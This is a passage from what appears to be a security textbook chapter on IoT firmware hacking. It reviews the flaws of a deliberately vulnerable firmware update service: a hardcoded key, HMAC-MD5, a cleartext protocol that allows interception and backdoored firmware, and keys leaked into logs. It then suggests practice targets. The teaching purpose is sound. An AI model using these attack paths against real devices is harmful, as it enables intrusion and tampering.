for writing %s Firmware downloaded successfully ```    Attackers could also discover the key by analyzing the server binary file (which would, however, be hosted on the cloud, making it harder to compromise). The client would normally reside on the IoT device, making it much easier for someone to inspect it.    You can read more about hardcoded passwords at [https://cwe.mitre.org/data/definitions/798.html](https://cwe.mitre.org/data/definitions/798.html).    #### Insecure Hashing Algorithms    The server and client rely on HMAC-MD5 for calculating a cryptographic hash the client uses to validate the firmware file’s integrity. Although the MD5 message-digest algorithm is now considered a broken and risky cryptographic hash function, HMAC-MD5 doesn’t suffer from the same weaknesses. HMAC is a keyed-hash message authentication code that uses a cryptographic hash function (in this case, MD5) and a secret cryptographic key (the preshared key in our example). As of today, HMAC-MD5 has not been proven to be vulnerable to the practical collision attacks that MD5 has. Nevertheless, current security best practices suggest that HMAC-MD5 shouldn’t be included in future cipher suites.    #### Unencrypted Communication Channels    A high-risk vulnerability for the update service is the use of an unencrypted communication channel. The client and server exchange information using a custom cleartext protocol over TCP. This means that if attackers attain a man-in-the-middle position on the network, they could capture and read the transmitted data. This includes the firmware file and the key used for authenticating against the server ([Figure 9-6](#figure9-6)). In addition, because the HMAC-MD5 relies on the same cryptographic key, the attacker could maliciously alter the firmware in transit and plant backdoors in it.    You can read more about this vulnerability at [https://cwe.mitre.org/data/definitions/319.html](https://cwe.mitre.org/data/definitions/319.html).    #### Sensitive Log Files    Last but not least, the client’s logging mechanism includes sensitive information (the `KEY` value) in log files (in this case, the */var/log/messages*). We showed the exact spot this occurred when walking through the client source code. This is a generally insecure practice, because log files typically have insecure file permissions (often, they’re readable by everyone). In many cases, the log output appears in less secure areas of the IoT system, such as in a web interface that doesn’t require admin privileges or a mobile app’s debugging output.  ![f09006](Images/f09006.png)    Figure 9-6: A Wireshark screenshot showing the transmission of sensitive information (an authentication key) over an unencrypted TCP protocol      ## Conclusion    In this chapter, we explored firmware reverse engineering and research. Every device has a firmware, and even though analyzing it looks intimidating at first, you can easily learn to do it by practicing the techniques in this chapter. Firmware hacking can extend your offensive security capabilities and is a great skill for your tool set.    Here, you learned the different ways of obtaining and extracting firmware. You emulated a single binary and the whole firmware and loaded a vulnerable firmware to a device. Then you researched and identified vulnerabilities on an intentionally vulnerable firmware service.    To continue practicing targeting a vulnerable firmware, try the OWASP IoTGoat ([https://github.com/OWASP/IoTGoat/](https://github.com/OWASP/IoTGoat/)), a deliberately insecure firmware based on OpenWrt and maintained by OWASP. Or try the Damn Vulnerable ARM Router (DVAR), an emulated Linux-based ARM router that runs a vulnerable web server ([https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)). Those of you who want to try your skills on a low-cost ($17) physical device can try the Damn Vulnerable IoT Device (DVID). It’s an open source, vulnerably designed IoT device that you can build upon a cheap Atmega328p microcontroller and an OLED screen.```` `````", "`````` ``````"]